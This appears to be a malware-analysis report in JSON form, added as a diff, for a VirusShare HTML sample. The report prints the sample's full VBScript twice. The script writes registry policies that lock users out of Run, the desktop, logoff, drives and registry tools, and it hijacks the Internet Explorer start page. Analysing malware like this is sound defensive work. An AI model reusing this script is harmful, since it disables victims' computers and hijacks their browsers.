@@ -1,0 +1,68 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "System": "May run an executable file or a system command on a Mac",
+            "Windows": "May enumerate application windows",
+            "Wscript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "<HTML>\n<HEAD><TITLE>\ufffd\ufffd\ufffd\ufffd</TITLE>\n<script Language=VBS>\nSet fs=CreateObject(\"Scripting.FileSystemObject\")\nSet dir1=fs.GetSpecialFolder(0)\nSet dir2=fs.GetSpecialFolder(1)\nSet so=CreateObject(\"Scripting.FileSystemObject\")\ndim r\nSet r=CreateObject(\"Wscript.Shell\")\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives\",63000000,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools\",1,\"REG_DWORD\"\nr.Regwrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ScanRegistry\",\"\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoLogOff\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\\NoRealMode\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDesktop\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\\Disabled\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetTaskBar\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoViewContextMenu\",1,\"REG_DWORD\"\nr.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetFolders\",1,\"REG_DWORD\"\nr.Regwrite \"HKLM\\Software\\CLASSES\\.reg\\\",\"txtfile\"\nr.Regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\HomePage\",1,\"REG_DWORD\"\nr.Regwrite \"HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\",\"http://www.macrosoft.com\"\n</script>\n</HEAD>\n</HTML>"
+    },
+    "filename": "VirusShare_3fb0f455d11c2e8c80d47d3ef200469c",
+    "filesize": 1803,
+    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3fb0f455d11c2e8c80d47d3ef200469c",
+        "sha1": "e77e4b12c07117f66cecf378e95eaa979279abdf",
+        "sha256": "dcd6552aa5e32ab71c728c108ab6a4cb0ec863ad9621765ee7a71241b17e385d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<HTML>",
+            "<HEAD><TITLE></TITLE>",
+            "<script Language=VBS>",
+            "Set fs=CreateObject(\"Scripting.FileSystemObject\")",
+            "Set dir1=fs.GetSpecialFolder(0)",
+            "Set dir2=fs.GetSpecialFolder(1)",
+            "Set so=CreateObject(\"Scripting.FileSystemObject\")",
+            "dim r",
+            "Set r=CreateObject(\"Wscript.Shell\")",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives\",63000000,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ScanRegistry\",\"\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoLogOff\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\\NoRealMode\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDesktop\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\\Disabled\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetTaskBar\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoViewContextMenu\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetFolders\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKLM\\Software\\CLASSES\\.reg\\\",\"txtfile\"",
+            "r.Regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\HomePage\",1,\"REG_DWORD\"",
+            "r.Regwrite \"HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\",\"http://www.macrosoft.com\"",
+            "</script>",
+            "</HEAD>",
+            "</HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.macrosoft.com"
+        ]
+    },
+    "time": "0:00:00.281021",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
